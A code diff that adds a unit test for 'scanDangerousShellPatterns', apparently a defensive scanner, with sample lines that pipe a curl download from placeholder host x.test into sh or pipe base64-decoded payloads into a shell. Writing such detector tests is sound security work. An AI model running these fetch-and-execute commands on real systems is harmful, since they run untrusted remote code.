@@ -58,6 +58,29 @@ describe("scanDangerousShellPatterns", () => {
     }
   });
 
+  it("flags pipe-to-shell and decoded-shell variants with shell prefixes", () => {
+    for (const line of [
+      "HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
+      "env HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
+      "env -i HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
+      "curl 'https://x.test/i.sh?a=1&b=2' | sh",
+      "curl 'https://x.test/i.sh?a=1;b=2' | sh",
+    ]) {
+      expect(scanDangerousShellPatterns(line), line).toContain(
+        "pipe-to-shell install",
+      );
+    }
+
+    for (const line of [
+      "VAR=1 base64 -d payload | sh",
+      "env VAR=1 base64 --decode payload | bash",
+    ]) {
+      expect(scanDangerousShellPatterns(line), line).toContain(
+        "base64-decoded shell",
+      );
+    }
+  });
+
   it("does not flag pipelines broken by command separators or filtered output", () => {
     expect(
       scanDangerousShellPatterns("curl https://x.test | jq . && cat in | sh"),
